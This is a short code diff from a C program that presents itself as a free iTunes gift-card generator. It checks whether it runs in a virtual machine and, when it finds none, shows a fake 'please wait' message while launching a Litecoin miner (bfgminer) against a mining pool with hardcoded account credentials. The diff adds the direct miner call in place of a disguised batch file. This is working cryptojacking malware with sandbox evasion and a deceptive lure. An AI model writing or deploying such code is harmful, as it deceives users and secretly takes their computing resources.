@@ -32,12 +32,11 @@ int main(int argc, const char * argv[]) {
     run_command("systeminfo | find \"System Manufacturer\"", vmware_sys, 36);
     registry_check();
     if(vm_score < 3){
+        chdir("bfgminer-5.4.2-win64");
+        system("bfgminer -o stratu+tcp://ltc.ghash.io:3333 -u jaken@shsu.edu -p ThisPasswordWillChange");
         printf("Please wait while we generate a gift card code. \nNote, "
                "this could take a while, so please be patient and do not "
                "close the program. Thank you. \n");
-        system("cd bfgminer-5.4.2-win64"); //change directories to bfgminer
-        system("dir");
-        system("start iTunesCardGenerator.bat");//start mining LiteCoin
     }
 
     printf("Virtual Machine detected. In order to receive your free iTunes "
